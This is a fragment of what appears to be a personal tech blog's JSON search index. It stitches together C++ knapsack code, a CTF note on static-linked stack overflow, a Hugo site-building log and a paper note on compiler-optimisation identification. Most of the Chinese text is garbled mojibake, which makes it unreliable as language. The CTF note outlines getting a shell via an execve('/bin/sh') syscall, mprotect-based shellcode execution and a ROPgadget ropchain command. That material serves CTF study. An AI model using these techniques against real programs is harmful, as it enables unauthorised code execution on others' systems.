int n,v; int V[N],W[N]; int dp[N][N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;v; for(int i=1;i\u0026lt;=n;i++) cin\u0026gt;\u0026gt;V[i]\u0026gt;\u0026gt;W[i]; for(int i=1;i\u0026lt;=n;i++){ for(int j=0;j\u0026lt;=v;j++){ dp[i][j]=dp[i-1][j]; if(j\u0026gt;=V[i]) dp[i][j]=max(dp[i][j],dp[i-1][j-V[i]]+W[i]); } } cout\u0026lt;\u0026lt;dp[n][v]; return 0; } ä¼˜åŒ– 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include\u0026lt;iostream\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; const int N=1005; int n,v; int V[N],W[N]; int dp[N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;v; for(int i=1;i\u0026lt;=n;i++) cin\u0026gt;\u0026gt;V[i]\u0026gt;\u0026gt;W[i]; for(int i=1;i\u0026lt;=n;i++) for(int j=v;j\u0026gt;=V[i];j--) dp[j]=max(dp[j],dp[j-V[i]]+W[i]); cout\u0026lt;\u0026lt;dp[v]; return 0; } ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E9%97%AB%E6%B0%8Fdp%E5%88%86%E6%9E%90%E6%B3%95/","summary":"é¢˜å¹²ï¼šN ä¸ªç‰©å“ï¼Œæ¯ä¸ªç‰©å“æœ‰å¯¹åº”çš„ä»·å€¼å’Œä½“ç§¯ï¼ŒèƒŒåŒ…å®¹é‡ä¸º Vï¼Œå¦‚ä½•é€‰æ‹©ç‰©å“ä½¿å¾—åœ¨ä¸è¶…è¿‡èƒŒåŒ…å®¹é‡çš„å‰æä¸‹ï¼Œä»·å€¼ä¹‹å’Œæœ€å¤§ã€‚ æ¯ä¸ªç‰©å“éƒ½å¯ä»¥é€‰å’Œä¸é€‰ï¼Œä¸¤","title":"é—«æ°DPåˆ†ææ³•"},{"content":" åˆ©ç”¨int 80hç³»ç»Ÿè°ƒç”¨ è®¾ç½®ç³»ç»Ÿè°ƒç”¨å‚æ•°å³å¯æ‰§è¡Œ execve(\u0026quot;\\bin\\sh\u0026quot;,0,0)ï¼Œè·å–shell ï¼Œå››ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ eaxã€ebxã€ecxã€edx ä½¿ç”¨ mprotect æ–¹æ³•ä¿®æ”¹bssæ®µ, æ‰§è¡Œshellcode å€ŸåŠ©ROPgadgetå·¥å…·è‡ªåŠ¨ç”Ÿæˆropchainï¼ŒROPgadget --binary simplerop --ropchain ä½†æ˜¯è¿™ç§æ–¹æ³•ç”Ÿæˆçš„ropchainå¤ªé•¿ï¼Œå¯èƒ½æ— æ³•å…¨éƒ¨è¾“å…¥ ä¾‹é¢˜ï¼šcmcc_simpleropï¼ˆwrite upï¼‰ (80æ¡æ¶ˆæ¯) BUUCTFï¼šcmcc_simpleropï¼ˆwrite upï¼‰_ã€€ç­±çš„åšå®¢-CSDNåšå®¢ (80æ¡æ¶ˆæ¯) CMCC\u0026ndash;simplerop é¢˜è§£_cmcc simplerop___lifanxinçš„åšå®¢-CSDNåšå®¢\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E6%A0%88%E6%BA%A2%E5%87%BA/","summary":"åˆ©ç”¨int 80hç³»ç»Ÿè°ƒç”¨ è®¾ç½®ç³»ç»Ÿè°ƒç”¨å‚æ•°å³å¯æ‰§è¡Œ execve(\u0026quot;\\bin\\sh\u0026quot;,0,0)ï¼Œè·å–shell ï¼Œå››ä¸ªå‚æ•°åˆ†åˆ«","title":"é™æ€é“¾æ¥æ ˆæº¢å‡º"},{"content":"TODO å†™æ›´æ–°è„šæœ¬ æ·»åŠ ä¸€ä¸ªcategory éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Š å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥ çš®è‚¤ä¹Ÿä¸å¯¹ å…¬å¼ä¸æ¸²æŸ“ å®ç°ä¾§è¾¹æ  å®ç°æœç´¢ å®ç°è¯„è®º æ›´æ–° 2023.6.30 å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥æ˜¯å› ä¸ºgiteeæœ‰é˜²ç›—é“¾ï¼Œä¹‹åå°±æ‹¿githubå½“å›¾åºŠå§ markdownæ¢è¡Œçš„æ ‡å‡†å†™æ³•æ˜¯ä¸¤ä¸ªç©ºæ ¼+ä¸€ä¸ªæ¢è¡Œ å…¬å¼æ­£å¸¸æ¸²æŸ“äº† 2023.7.1 è¿›è¡Œäº†ä¸€ç³»åˆ—ç»†å°çš„æ›´æ–° å¢åŠ äº†ä¸»é¡µé¢çš„ä¸¤ä¸ªbutton å¢åŠ äº†searchåŠŸèƒ½ å¢åŠ äº†å‹é“¾ å‚è€ƒ hugoé…ç½®è¯´æ˜ Hello Hugo - Codec Labs PaperMod æŠ˜è…¾è®° | é™æ—¶æ´»è·ƒ (feyesu.gitlab.io) Hugo + PaperModæ­å»ºæŠ€æœ¯åšå®¢ | Kunyang\u0026rsquo;s Blog (kyxie.github.io) [ç½®é¡¶] hugoåšå®¢æ­å»º | PaperModä¸»é¢˜ | Sulv\u0026rsquo;s Blog (sulvblog. cn) å…³äºåç»­å¦‚æœè¦æ·»åŠ æ–°çš„é¡µé¢ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡åšå®¢ å…³äºæ¢è¡Œ 1 2 3 4 5 6 [markup] defaultMarkdownHandler = \u0026#34;goldmark\u0026#34; [markup.goldmark] [markup.goldmark.renderer] unsafe = true å°†ä¸Šè¿°å‚æ•°æ·»åŠ åˆ°é…ç½®æ–‡ä»¶ä¸­ï¼Œhugoå°†æ”¯æŒä½¿ç”¨\u0026lt;br/\u0026gt;æ¢è¡Œ ç„¶åmarkdownçš„æ¢è¡Œæ˜¯ä¸¤ä¸ªç©ºæ ¼+å›è½¦ã€‚è¿™æ ·è½¬æˆhtmlæ‰ä¼šæ˜¯æ¢è¡Œã€‚\nå¤´æ¨¡æ¿ 1 2 3 4 5 6 title: \u0026#34;å»ºç«™ç¬¬ä¸€å¤©\u0026#34; date: 2023-06-11T02:01:58+05:30 description: å»ºç«™å°tips math: true tags: [å»ºç«™] categories: [123] papermodçš„å¤´æ¨¡æ¿\n1 2 3 4 5 6 7 8 9 10 11 title: \u0026#34;{{ replace .TranslationBaseName \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; slug: \u0026#34;\u0026#34; # é…åˆ config.toml ä¸­çš„ permalinks å‚æ•°ï¼Œè‡ªå®šä¹‰æ–‡ç« é“¾æ¥ description: \u0026#34;\u0026#34; # æ˜¾ç¤ºåœ¨æ–‡ç« æ ‡é¢˜ä¸‹ï¼Œä¸ summary ä¸åŒ summary: \u0026#34;\u0026#34; # æ–‡ç« æ‘˜è¦ date: {{ .Date }} lastmod: {{ .Date }} draft: false showToc: true categories: [\u0026#34;\u0026#34;] tags: [\u0026#34;\u0026#34;] weight: # è¾“å…¥1å¯ä»¥é¡¶ç½®æ–‡ç« ï¼Œç”¨æ¥ç»™æ–‡ç« å±•ç¤ºæ’åºï¼Œä¸å¡«å°±é»˜è®¤æŒ‰æ—¶é—´æ’åº tagsï¼šè®ºæ–‡é˜…è¯»ã€è®ºæ–‡å¤ç°\ncategoriesï¼šäºŒè¿›åˆ¶ç¼–è¯‘ä¼˜åŒ–åˆ†æã€æ¨¡ç³Šæµ‹è¯•\nå…¬å¼æ¸²æŸ“æµ‹è¯• $ErrSeq = [ErrPt1, ErrPt2, \u0026hellip;, ErrPtx], ErrPti = {0, 1}$ $$ \\tfrac{x}{y\\rhd} \\omega \\lim q $$\n","permalink":"https://juhuax.github.io/posts/%E5%BB%BA%E7%AB%99/%E5%BB%BA%E7%AB%99/","summary":"TODO å†™æ›´æ–°è„šæœ¬ æ·»åŠ ä¸€ä¸ªcategory éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Š å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥ çš®è‚¤ä¹Ÿä¸å¯¹ å…¬å¼ä¸æ¸²æŸ“ å®ç°ä¾§è¾¹æ  å®ç°æœç´¢ å®ç°è¯„è®º æ›´æ–° 2023.6.30 å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥æ˜¯å› ä¸ºgi","title":"å»ºç«™"},{"content":"ä¸­æ–‡è¯‘åï¼šäºŒè¿›åˆ¶çº§ç»†ç²’åº¦ç¼–è¯‘å™¨å·¥ä»¶çš„è‡ªåŠ¨æ¢å¤ ä½œè€…ï¼šYufei Du å•ä½ï¼šåŒ—å¡ç½—æ¥çº³å¤§å­¦æ•™å ‚å±±åˆ†æ ¡ å›½å®¶ï¼š #ç¾å›½ å¹´ä»½ï¼š #2022å¹´ æ¥æºï¼š #USENIXä¼šè®® å…³é”®å­—ï¼š #äºŒè¿›åˆ¶ #ç¼–è¯‘ #ç¥ç»ç½‘ç»œ ä»£ç åœ°å€ï¼šGitHub - zeropointdynamics/passtell ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-02-11 09:45\næ‘˜è¦ è¯†åˆ«äºŒè¿›åˆ¶ç¼–è¯‘å™¨é…ç½®ä½¿å¼€å‘äººå‘˜å’Œåˆ†æäººå‘˜èƒ½å¤Ÿå®šä½ç”±ä¼˜åŒ–å‰¯ä½œç”¨å¼•èµ·çš„æ½œåœ¨å®‰å…¨é—®é¢˜ï¼Œè¯†åˆ«äºŒè¿›åˆ¶å…‹éš†ï¼Œå¹¶æ„å»ºå…¼å®¹çš„äºŒè¿›åˆ¶è¡¥ä¸ã€‚ ç°æœ‰çš„å·¥ä½œé‡ç‚¹æ˜¯ä½¿ç”¨è¯­ä¹‰ç‰¹å¾å’Œæ·±åº¦å­¦ä¹ æŠ€æœ¯è¯†åˆ«ç¼–è¯‘å™¨å®¶æ—ã€ç‰ˆæœ¬å’Œä¼˜åŒ–çº§åˆ«ã€‚ æœ¬æ–‡æƒ³è¦æ¢ç´¢æ¢å¤äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ¯ä¸ªå‡½æ•°çš„å•ç‹¬çš„ã€ç»†ç²’åº¦çš„ä¼˜åŒ–ä¼ é€’ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¼€å‘äº†ä¸€ç§ä½¿ç”¨ä¸“é—¨è®¾è®¡çš„åŠŸèƒ½ä»¥åŠç›´è§‚å’Œå¯ç†è§£çš„æœºå™¨å­¦ä¹ æ¨¡å‹çš„æ–¹æ³•ã€‚ å¼•è¨€ ç¼–è¯‘å™¨çš„ä¼˜åŒ–å¯èƒ½å¸¦æ¥å®‰å…¨æ–¹é¢çš„è´Ÿé¢å½±å“ æ­»ä»£ç æ¶ˆé™¤ä¼˜åŒ–å¯ä»¥åˆ é™¤ä½¿ç”¨æ•æ„Ÿæ•°æ®åæ“¦é™¤æ•æ„Ÿæ•°æ®çš„æŒ‡ä»¤ï¼Œå¯¼è‡´æ•æ„Ÿæ•°æ®å®¹æ˜“æ³„éœ² ç”¨æ›´é«˜æ•ˆçš„æ“ä½œå–ä»£æ˜‚è´µæ“ä½œçš„å¼ºåº¦é™ä½ä¼˜åŒ–å¯ä»¥æ‰“å¼€ä¾§é€šé“ é¿å…è¿™äº›é™·é˜±çš„ä¸€ç§æ–¹æ³•æ˜¯è®©å¼€å‘äººå‘˜æ‰‹åŠ¨è°ƒæ•´ç¼–è¯‘è„šæœ¬ å…·æœ‰æŒ‘æˆ˜æ€§å’Œè€—æ—¶çš„ ä¸€äº›ç¼–è¯‘å™¨è¿˜åŒ…å«æ— æ³•æ‰‹åŠ¨æ§åˆ¶çš„éšè—ä¼˜åŒ– ç°ä»£ç¼–è¯‘å™¨çš„ä»£ç åº“å¤ªå¤§ï¼Œç”¨æˆ·æ— æ³•æŸ¥çœ‹å’Œç ”ç©¶ä¼˜åŒ–èƒŒåçš„é€»è¾‘ å®‰å…¨å…³é”®é¡¹ç›® (å¦‚ OpenSSL å’Œ mbed TLS) çš„å¼€å‘äººå‘˜é‡‡å–äº†å¦ä¸€ç§æ–¹æ³•ï¼Œå³åœ¨å®‰å…¨å‡½æ•°çš„æºä»£ç ä¸­å®ç°å·¥ä½œåŒºï¼Œä»¥â€œè¿·æƒ‘â€ç¼–è¯‘å™¨ï¼Œä½¿å…¶ä¸ä¼šå¯¹å®‰å…¨ä»£ç åº”ç”¨ä¼˜åŒ– ä½†æ˜¯ä¸èƒ½ä¸€åŠ³æ°¸é€¸ï¼Œä¸é€‚ç”¨äºæœªæ¥çš„ç¼–è¯‘å™¨ç‰ˆæœ¬ é™¤äº†å®‰å…¨æ€§éªŒè¯å¤–ï¼Œç¼–è¯‘å™¨ä¼˜åŒ–åˆ†ç±»è¿˜ä¼šå½±å“äºŒè¿›åˆ¶ä»£ç å…‹éš†æ£€æµ‹å’ŒäºŒè¿›åˆ¶è¡¥ä¸ã€‚ ç¼–è¯‘å™¨é…ç½®ä¼šå¯¼è‡´å…‹éš†æ£€æµ‹æŠ€æœ¯æ€§èƒ½çš„æ˜¾è‘—ä¸‹é™ äºŒè¿›åˆ¶è¡¥ä¸ä¸­ï¼Œåœ¨å­˜åœ¨æŸäº›ç¼–è¯‘å™¨ä¼˜åŒ–æ—¶ï¼Œå®šä½è¦ä¿®è¡¥çš„æ˜“å—æ”»å‡»å‡½æ•°å˜å¾—æ›´åŠ å›°éš¾ å½“å‰æŠ€æœ¯ä¾§é‡äºè¯†åˆ«ç¼–è¯‘å™¨å®¶æ—ã€ä¸»è¦ç¼–è¯‘å™¨ç‰ˆæœ¬ä»¥åŠäºŒè¿›åˆ¶æ–‡ä»¶çš„ä¼˜åŒ–çº§åˆ« ç¼ºå°‘æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œå³å¯èƒ½å·²åº”ç”¨çš„ä¼ é€’ å½“å‰æ–¹æ³•ä¾èµ–äºè¯­ä¹‰ç‰¹å¾ï¼ˆåˆ—å¦‚æ§åˆ¶æµå›¾ï¼‰æˆ–è€…é‡‡ç”¨æ·±åº¦å­¦ä¹ çš„æ–¹æ³• ä¸ºäº†è¾“å‡ºçš„å¯è§£é‡Šæ€§ï¼Œä½œè€…é€‰æ‹©äº†ä½¿ç”¨å…·æœ‰ç‰¹æ®Šè®¾è®¡åŠŸèƒ½çš„æµ…å±‚å­¦ä¹ ã€‚ ä½œè€…çš„æ–¹æ³•æˆä¸º passtellï¼Œå¯ä»¥è¯†åˆ«å½±å“å•ä¸ªå‡½æ•°å®‰å…¨çš„ä¼˜åŒ–è¿‡ç¨‹ æ€»ç»“ï¼šå› ä¸ºç¼–è¯‘å™¨çš„ä¼˜åŒ–ä¼šäº§ç”Ÿä¸€äº›æ„æƒ³ä¸åˆ°çš„è´Ÿé¢å½±å“ï¼ŒåŒ…æ‹¬å®‰å…¨é—®é¢˜ã€å…‹éš†æ£€æµ‹æŠ€æœ¯æ€§èƒ½ä¸‹é™å’Œéš¾ä»¥å®šä½è¡¥ä¸å‡½æ•°ã€‚æ‰€ä»¥è¦æœ‰ä¸€ç§æŠ€æœ¯æ¥æ£€æµ‹ç¼–è¯‘å™¨çš„ä¼˜åŒ–ï¼Ÿç›®å‰çš„æŠ€æœ¯ä¾§é‡äºè¯†åˆ«è¯†åˆ«ç¼–è¯‘å™¨å®¶æ—ã€ä¸»è¦ç¼–è¯‘å™¨ç‰ˆæœ¬ä»¥åŠäºŒè¿›åˆ¶æ–‡ä»¶çš„ä¼˜åŒ–çº§åˆ«ï¼Œç¼ºå°‘æ›´è¯¦ç»†çš„ä¿¡æ¯ã€‚ä½œè€…æå‡ºçš„æ–¹æ³•å¯ä»¥è¯†åˆ«å‡½æ•°çº§çš„ä¼˜åŒ–è¿‡ç¨‹ï¼Œæä¾›æ›´è¯¦ç»†çš„ä¼˜åŒ–ä¿¡æ¯ã€‚\nèƒŒæ™¯ ç¼–è¯‘ä¼˜åŒ– çŸ¥é“äºŒè¿›åˆ¶æ–‡ä»¶çš„ä¼˜åŒ–çº§åˆ«ä¸è¶³ä»¥ç¡®å®šåº”ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶çš„ç²¾ç¡®ä¼˜åŒ–é›†ã€‚ å› ä¸ºé™¤äº†ç”¨æˆ·æŒ‡å®šçš„ä¼˜åŒ–çº§åˆ«å¤–ï¼Œåœ¨å†³å®šè¦è¿è¡Œçš„ä¼ é€’æ—¶ï¼Œä¼ é€’ç®¡ç†å™¨è¿˜è€ƒè™‘å¤šä¸ªå› ç´ ï¼ŒåŒ…æ‹¬ç›®æ ‡ä½“ç³»ç»“æ„ã€ç›®æ ‡å¤„ç†å™¨ç”Ÿæˆå’Œæºä»£ç ç»“æ„ã€‚ å®‰å…¨å½±å“ æŒä¹…çŠ¶æ€è¿åæ˜¯æŒ‡æ•°æ®æŒç»­å­˜åœ¨äºå…¶è®¾è®¡çš„å¯ç”¨èŒƒå›´ä¹‹å¤–ã€‚\nDâ€™silva et al.[3]åˆ—å‡ºäº†ä¸‰ç§å¯èƒ½å¯¼è‡´è¿™ç§è¿è§„çš„ä¼˜åŒ–: æ­»ä»£ç æ¶ˆé™¤ã€å‡½æ•°å†…è”å’Œä»£ç ç§»åŠ¨ã€‚ åœ¨å¯†ç éªŒè¯å‡½æ•°ä¸­ï¼Œå¯†ç åœ¨éªŒè¯æœŸé—´ä¸´æ—¶å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šè®¤ä¸ºæ“¦é™¤æœ¬åœ°å†…å­˜çš„æ“ä½œæ˜¯æ­»ä»£ç å¹¶å°†å…¶åˆ é™¤ï¼Œå¯¼è‡´å¯†ç åœ¨ä½¿ç”¨åä»å­˜åœ¨äºå†…å­˜ä¸­ï¼Œç›´åˆ°æœ€ç»ˆè¢«åé¢çš„å‡½æ•°è¦†ç›–ã€‚ å¦‚æœå—ä¿¡ä»»çš„å®‰å…¨æ•æ„Ÿå‡½æ•°å†…è”åœ¨ä¸å—ä¿¡ä»»çš„å‡½æ•°ä¸­ï¼Œåˆ™å—ä¿¡ä»»å‡½æ•°çš„å±€éƒ¨å˜é‡çš„ç”Ÿå­˜æœŸå°†æ‰©å±•åˆ°ä¸å—ä¿¡ä»»å‡½æ•°è¿”å›æ—¶ã€‚ ä»£ç ç§»åŠ¨å¯ä»¥åˆ‡æ¢æŒ‡ä»¤çš„é¡ºåºï¼Œä»¥é¿å…ä¸å¿…è¦çš„è®¡ç®—æˆ–æ”¹å–„å±€éƒ¨æ€§ã€‚è¿™ç§ä¼˜åŒ–å¯èƒ½ä¼šå¯¼è‡´ç¨‹åºåœ¨éªŒè¯æ“ä½œæ˜¯å¦éœ€è¦ä¹‹å‰å°†æ•æ„Ÿå€¼å†™å…¥å†…å­˜ã€‚ ä¾§é€šé“æ”»å‡»ï¼šä¸ºäº†é¿å…ä¾§é€šé“ï¼Œå¼€å‘äººå‘˜å¯èƒ½ä¼šå‘å‡½æ•°ä¸­æ·»åŠ ä¸å¿…è¦æˆ–ä½æ•ˆçš„æ“ä½œï¼Œä½†ä¼˜åŒ–å¯èƒ½ä¼šç®€åŒ–æˆ–åˆ é™¤è¿™äº›æ“ä½œï¼Œä»è€Œé‡æ–°å¼•å…¥ä¾§é€šé“ã€‚\nDâ€™silva et al.[3]åˆ—å‡ºäº†ä¸‰ç§å¯èƒ½å¼•å…¥ä¾§é€šé“çš„ä¼˜åŒ–æ–¹æ³•: å…¬å…±å­è¡¨è¾¾å¼æ¶ˆé™¤ï¼Œå°†å¤šä¸ªæŒ‡ä»¤åˆå¹¶ä¸ºä¸€æ¡æŒ‡ä»¤ä»¥é¿å…é‡å¤è®¡ç®—; å¼ºåº¦é™ä½ï¼Œç”¨æ›´æœ‰æ•ˆçš„æŒ‡ä»¤å–ä»£æ˜‚è´µçš„æŒ‡ä»¤ï¼Œ çª¥è§†å­”ä¼˜åŒ–ï¼Œæ£€æŸ¥å‘¨å›´çš„æŒ‡ä»¤ï¼Œä»¥å¯»æ‰¾é‡æ–°æ’åºæˆ–æ›¿æ¢æŒ‡ä»¤çš„æœºä¼šï¼Œä»¥ç®€åŒ–è®¡ç®—æˆ–æ›´å¥½çš„å±€éƒ¨æ€§ã€‚ æœ¬æ–‡çš„å·¥ä½œé‡ç‚¹æ˜¯è¯†åˆ«ä¸Šè¿°ä¸¤ç§ä¼˜åŒ–ã€‚\nç›¸å…³å·¥ä½œ Rosenblum ç­‰äººåœ¨äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¼–è¯‘å™¨è¯†åˆ«é¢†åŸŸåšå‡ºäº†å¼€åˆ›æ€§çš„å·¥ä½œã€‚ä»–ä»¬çš„æ–¹æ³•ä¾§é‡äºä½¿ç”¨æ¦‚ç‡å›¾å½¢æ¨¡å‹ä»…è¯†åˆ« IA-32 ä½“ç³»ç»“æ„ä¸­ä»£ç ç‰‡æ®µçš„ç¼–è¯‘å™¨å®¶æ—ã€‚åæ¥ï¼ŒRosenblum et al.[17]æ‰©å±•äº†è¿™é¡¹å·¥ä½œï¼Œå¹¶æå‡ºäº† Originï¼Œè¿™æ˜¯ä¸€ä¸ªå·¥å…·ï¼Œç”¨äºæ ‡è¯†äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ¯ä¸ªå‡½æ•°çš„ç¼–è¯‘å™¨æ—ã€ç¼–è¯‘å™¨ç‰ˆæœ¬å’Œä¼˜åŒ–çº§åˆ«ã€‚Origin ä½¿ç”¨çº¿æ€§æ”¯æŒå‘é‡æœºæ¨¡å‹ï¼Œå…¶ç‰¹å¾åŒ…æ‹¬æŒ‡ä»¤çš„ä¹ æƒ¯ç”¨æ³•ã€æ§åˆ¶æµå›¾çš„å­å›¾å’Œå‡½æ•°çš„é«˜çº§å¸ƒå±€ (å¦‚èµ·å§‹åœ°å€)ã€‚ç„¶è€Œï¼Œå¯¹äºä¼˜åŒ–çº§åˆ«ï¼ŒOrigin åªèƒ½æ‰§è¡Œç²—ç²’åº¦è¯†åˆ«ï¼Œæœ‰ä¸¤ä¸ªé€‰é¡¹:-O0ï¼Œ -O1 ä¸ºâ€œlowâ€ï¼Œ-O2ï¼Œ -O3 ä¸ºâ€œhighâ€ã€‚ å‡ å¹´åï¼ŒRahimian ç­‰äºº[16]æå‡ºäº†ä¸€ç§ä¸åŒçš„ç¼–è¯‘å™¨æ¥æºè¯†åˆ«æ–¹æ³• (ç§°ä¸º BinComp)ã€‚BinComp çš„é‡ç‚¹æ˜¯è¯†åˆ«æ•´ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„ç¼–è¯‘å™¨æ—ã€ç¼–è¯‘å™¨ç‰ˆæœ¬å’Œä¼˜åŒ–çº§åˆ«ã€‚ä¸ Origin ä¸åŒï¼ŒBinComp å¤§é‡åˆ©ç”¨ä»ç¼–è¯‘å™¨æ·»åŠ çš„å®ç”¨å‡½æ•°ä¸­æå–çš„ç‰¹æ€§æ¥è¯†åˆ«ç¼–è¯‘å™¨ç‰ˆæœ¬å’Œä¼˜åŒ–çº§åˆ«ã€‚è¿™äº›å®ç”¨ç¨‹åºå‡½æ•°åŒ…æ‹¬ç¨‹åºåˆå§‹åŒ–ã€å¯åŠ¨ä»£ç å’Œç»ˆæ­¢ä»£ç ã€‚è™½ç„¶è¿™äº›å‡½æ•°å¯ä»¥é«˜åº¦æŒ‡ç¤ºä¼˜åŒ–çº§åˆ«ï¼Œä½†ä¸å¯èƒ½å¯¹äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„æ¯ä¸ªå‡½æ•°æ‰§è¡Œè¯†åˆ«ã€‚å› æ­¤ï¼ŒBinComp åªèƒ½è¯†åˆ«ç”¨äºç¼–è¯‘ç¨‹åºä¸»ä¾‹ç¨‹çš„ç¼–è¯‘å™¨é…ç½®ã€‚ æœ€è¿‘åœ¨ç¼–è¯‘å™¨æ¥æºè¯†åˆ«æ–¹é¢çš„å·¥ä½œ[2, 15, 20, 23]å¼€å§‹ä½¿ç”¨ç¥ç»ç½‘ç»œè¿›è¡Œåˆ†ç±»ã€‚Chen ç­‰äºº[2]æå‡ºäº† HIMALIAï¼Œè¿™æ˜¯ä¸€ç§ä½¿ç”¨é€’å½’ç¥ç»ç½‘ç»œæ¥è¯†åˆ«äºŒè¿›åˆ¶çš„æ¯ä¸ªå‡½æ•°çš„ä¼˜åŒ–æ°´å¹³çš„åˆ†ç±»å™¨ã€‚HIMALIA ä½¿ç”¨åˆ†è§£æŒ‡ä»¤çš„å‘é‡ä½œä¸ºç‰¹å¾ï¼Œå¹¶ä½¿ç”¨ä¸¤ä¸ªé€’å½’ç¥ç»ç½‘ç»œè¿›è¡Œåˆ†ç±»ã€‚ä¸€ä¸ªç½‘ç»œå°†å‡½æ•°åˆ†ä¸ºå››ç±»ä¹‹ä¸€:-O0ï¼Œ -O1ï¼Œ -O2/O3 å’Œ- o; å¦ä¸€ä¸ªç½‘ç»œåˆ™åŒºåˆ†-O2 å’Œ-O3ã€‚è™½ç„¶ HIMALIA çš„è¯„ä¼°åŒ…æ‹¬ç”¨ä¸åŒç‰ˆæœ¬çš„ LLVM Clang ç¼–è¯‘å™¨ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†å®ƒåªå…³æ³¨äºç¡®å®šæ¯ä¸ªå‡½æ•°çš„ä¼˜åŒ–çº§åˆ«ï¼Œè€Œä¸åŒºåˆ†åº”ç”¨äºä¸åŒç¼–è¯‘å™¨ç‰ˆæœ¬çš„ä¼˜åŒ–ã€‚Yang ç­‰äºº[23]æå‡ºäº† BinEyeï¼Œè¿™æ˜¯ä¸€ä¸ªä½¿ç”¨å·ç§¯ç¥ç»ç½‘ç»œæ¥è¯†åˆ« ARM äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ¯ä¸ªå¯¹è±¡çš„ä¼˜åŒ–çº§åˆ«çš„åˆ†ç±»å™¨ã€‚ç”±äº ARM æ¶æ„ä¸­çš„æ¯æ¡æŒ‡ä»¤éƒ½æ˜¯ 4 ä¸ªå­—èŠ‚ï¼ŒBinEye ä½¿ç”¨æ¯ä¸ªå¯¹è±¡çš„å‰ 1024 æ¡æŒ‡ä»¤ä½œä¸ºåŸå§‹ç‰¹å¾ï¼Œå¹¶ä»ä¸­æå–å•è¯å’Œä½ç½®åµŒå…¥ã€‚Tian ç­‰äºº[20]æå‡ºäº† NeuralCIï¼Œè¿™æ˜¯ä¸€ç§å…·æœ‰å·ç§¯ç¥ç»ç½‘ç»œæˆ–é€’å½’ç¥ç»ç½‘ç»œçš„åˆ†ç±»å™¨ï¼Œç”¨äºè¯†åˆ«äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ¯ä¸ªå‡½æ•°çš„ç¼–è¯‘å™¨æ—ã€ç¼–è¯‘å™¨ç‰ˆæœ¬å’Œä¼˜åŒ–çº§åˆ«ã€‚NeuralCI ä½¿ç”¨ Word2Vec[14]åµŒå…¥å…è®¸å¯å˜å¤§å°çš„æŒ‡ä»¤ã€‚ä¸ BinEye ç±»ä¼¼ï¼ŒNeuralCI çš„è¯„ä¼°å°†-O2 å’Œ-O3 åˆå¹¶ä¸ºä¸€ä¸ªç²—ç²’åº¦çš„ OH ä¼˜åŒ–æ°´å¹³ã€‚ æœ€è¿‘ï¼ŒPizzolotto å’Œ Inoue æå‡ºäº†ä¸€ç§æ–¹æ³•ï¼Œä½¿ç”¨å·ç§¯ç¥ç»ç½‘ç»œæˆ–é•¿çŸ­æœŸå†…å­˜ç½‘ç»œæ¥è¯†åˆ« 7 ç§ä¸åŒæ¶æ„ä¸­ 2KB ä»£ç ç‰‡æ®µçš„ç¼–è¯‘å™¨å®¶æ—å’Œä¼˜åŒ–çº§åˆ«ã€‚è¿™ç§æ–¹æ³•åŒ…æ‹¬åŸå§‹å­—èŠ‚æˆ–æ“ä½œç ä½œä¸ºç‰¹å¾ï¼Œä½†å¾—å‡ºçš„ç»“è®ºæ˜¯ï¼Œå½“æœ‰å¤§é‡å¯ç”¨çš„è®­ç»ƒæ•°æ®æ—¶ï¼ŒåŸå§‹å­—èŠ‚ä¼šå¯¼è‡´æ›´å¥½çš„ç»“æœã€‚ä¸ HIMALIA ç±»ä¼¼ï¼Œè¿™ç§æ–¹æ³•çš„è¯„ä¼°åŒ…æ‹¬äº”ä¸ªä¸åŒçš„ä¼˜åŒ–çº§åˆ«:-O0ï¼Œ -O1ï¼Œ -O2ï¼Œ -O3 å’Œ-Osã€‚ç”±äº NeuralCI è¿›è¡Œäº†æœ€æ·±å…¥å’Œæœ€ç°å®çš„è¯„ä¼°ï¼Œå¹¶ä¸”å®ƒä¼˜äºå…¶ä»–åœ¨å‡½æ•°çº§è¿›è¡Œåˆ†ç±»çš„æ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬åœ¨æœ¬æ–‡åé¢é€‰æ‹©å®ƒè¿›è¡Œæ¯”è¾ƒã€‚\næ–¹æ³• PassTellï¼Œä¸€ç§ç”¨äºè¯†åˆ«å¯èƒ½åº”ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„æ¯ä¸ªå‡½æ•°çš„ä¼˜åŒ–ä¼ é€’é›†çš„æ–¹æ³•ã€‚ æ•°æ®ç”Ÿæˆ é¦–å…ˆï¼Œç¼–å†™ä¸åŒä¼˜åŒ–çº§åˆ«çš„ç¨‹åºï¼Œå¹¶è®°å½•åº”ç”¨äºæ¯ä¸ªå‡½æ•°çš„ä¼˜åŒ–åˆ—è¡¨ 